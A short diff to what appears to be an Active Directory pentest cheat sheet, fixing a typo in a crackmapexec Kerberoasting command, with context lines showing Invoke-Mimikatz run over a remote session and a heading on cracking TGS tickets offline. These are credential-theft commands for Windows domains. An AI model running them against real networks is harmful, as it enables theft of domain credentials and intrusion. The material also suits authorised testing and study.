@@ -232,7 +232,7 @@ Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimikatz.ps1 -Session $sess
 
 find:
 ```
-crackmapexec ldap <dcip> -u <user> -p <password> --kdcHost <dcip> --kerberoasting output.txtls
+crackmapexec ldap <dcip> -u <user> -p <password> --kdcHost <dcip> --kerberoasting output.txt
 ```
 crack TGS offline:
 ```
